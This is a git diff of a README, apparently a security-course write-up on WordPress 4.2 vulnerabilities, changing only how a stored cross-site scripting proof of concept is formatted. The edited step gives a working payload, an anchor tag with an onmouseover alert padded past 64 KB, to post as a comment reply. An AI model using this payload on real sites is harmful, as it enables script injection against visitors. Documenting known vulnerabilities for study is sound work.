@@ -23,7 +23,7 @@ Time spent: **X** hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: ![xss](https://user-images.githubusercontent.com/15334096/38169106-dac0eaae-352e-11e8-9e42-2c37fdc20bd1.gif)
-  - [ ] Steps to recreate: Post a reply on one of the pages. Insert javascript for alert: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> and make sure message is bigger than 64kb. Then when submitted, an alert box should appear.
+  - [ ] Steps to recreate: Post a reply on one of the pages. Insert javascript for alert: ``` <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>```  and make sure message is bigger than 64kb. Then when submitted, an alert box should appear.
   - [ ] Affected source code: 
 
     - [Link 1](http://klikki.fi/adv/wordpress2.html)
